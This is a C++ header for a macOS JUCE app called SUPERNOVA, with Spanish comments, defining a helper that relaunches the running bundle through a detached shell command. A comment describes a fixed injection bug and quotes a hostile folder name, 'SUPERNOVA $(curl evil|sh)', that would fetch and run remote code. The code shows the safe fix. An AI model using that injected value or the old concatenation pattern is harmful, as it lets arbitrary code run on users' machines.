#pragma once
// REOPEN — relanzar SUPERNOVA. Suena trivial y no lo es: el 5-sep el botón abrió OTRA copia (la 0.1.0 vieja
// de /Applications) en vez de la que estaba corriendo, porque LaunchServices resuelve por IDENTIFICADOR de
// bundle cuando hay dos copias registradas con el mismo. La copia que hay que reabrir es SIEMPRE la que está
// corriendo — [NSBundle mainBundle].bundleURL —, nunca "la app com.ovni.supernova.app".
//
// Y hay que esperar a que este proceso MUERA antes de abrirla: JUCE mata la segunda instancia si la primera
// sigue viva (juce_ApplicationBase.cpp:290, JUCE_HANDLE_MULTIPLE_INSTANCES incluye macOS) y
// moreThanOneInstanceAllowed() es false. Por eso el relanzamiento no puede ser una llamada a NSWorkspace
// desde acá: lo hace un /bin/sh DESADJUNTADO que espera nuestro PID y recién ahí abre una instancia nueva de
// esa URL exacta ("open -n <ruta>" = openApplicationAtURL: con createsNewApplicationInstance=YES).
#include <juce_core/juce_core.h>

namespace supernova {

// PURO (testeable): el ARGV del relanzador. Espera al PID y abre una instancia NUEVA de ESA ruta.
//
// La ruta NO SE INTERPOLA en el script. Hasta 0.3.0 esto era una concatenación (…open -n "" + bundlePath + "")
// metida en un `sh -c`: una carpeta llamada `SUPERNOVA $(curl evil|sh)` — un nombre de carpeta legal, que
// cualquiera puede crear en Descargas — ejecutaba eso al tocar REOPEN. Ahora el string del -c es CONSTANTE
// y todo lo variable viaja como argumento posicional del shell, que NO vuelve a pasar por el parser:
//   $0 = "snv-relaunch" (nombre para ps) · $1 = pid · $2 = ruta del bundle · $3 = herramienta que abre.
// openTool es parámetro para que el test pueda correr el MISMO argv con /bin/echo y mirar qué llegó.
inline juce::StringArray relaunchWaiterCommand (const juce::String& bundlePath, int pid,
                                                const juce::String& openTool = "/usr/bin/open")
{
    return { "/bin/sh", "-c",
             "while /bin/kill -0 \"$1\" 2>/dev/null; do sleep 0.15; done; exec \"$3\" -n \"$2\"",
             "snv-relaunch", juce::String (pid), bundlePath, openTool };
}

// Ruta de la copia que está corriendo ([NSBundle mainBundle].bundleURL). Vacía si no se pudo resolver.
juce::String runningBundlePath();

// Lanza el relanzador desadjuntado y pide el quit. No vuelve a la UI con nada útil.
void relaunchThisBundle();

} // namespace supernova
